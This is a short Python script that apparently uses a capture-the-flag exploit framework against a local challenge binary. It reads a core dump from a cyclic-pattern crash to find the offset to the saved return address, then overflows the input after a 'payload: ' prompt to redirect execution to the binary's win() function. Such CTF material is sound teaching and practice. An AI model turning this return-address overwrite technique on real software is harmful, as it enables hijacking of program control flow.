from pwnx import Challenge, line
from pwnx.backends.diagnostics import Corefile


c = Challenge("./chall")

# First run the target with pwnx.compat.pwntools.cyclic(512), then load the core.
core = Corefile("./core")
c.control(line("payload: "), return_at=core.cyclic_offset("rip"))
c.want(c.exe.win())

c.run()
